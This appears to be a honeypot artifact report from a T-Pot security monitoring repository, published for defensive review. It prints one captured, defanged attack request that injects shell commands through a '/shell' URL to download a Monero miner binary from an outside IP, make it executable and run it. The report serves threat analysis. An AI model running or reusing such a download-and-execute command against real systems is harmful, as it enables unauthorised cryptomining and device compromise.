# 9aa7a35fbcc3f64dbc8cc7a1843d268993a1284609f0b5fa4620efcb2956a38d

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `9aa7a35fbcc3f64dbc8cc7a1843d268993a1284609f0b5fa4620efcb2956a38d` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+monero.arm+monero.arm7;wget+http:/\/152[.]89[.]76[.]XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
